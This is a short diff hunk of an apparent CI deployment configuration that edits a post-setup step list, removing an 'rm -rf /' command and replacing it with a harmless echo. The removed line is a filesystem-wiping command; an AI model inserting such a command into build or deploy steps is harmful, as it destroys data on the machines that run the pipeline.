@@ -4,4 +4,4 @@ deploy:
       setupVariables:
         after:
           - 'echo -e "Generated \"backend.tf\": \n$(cat backend.tf)"'
-          - rm -rf /
+          - echo echo
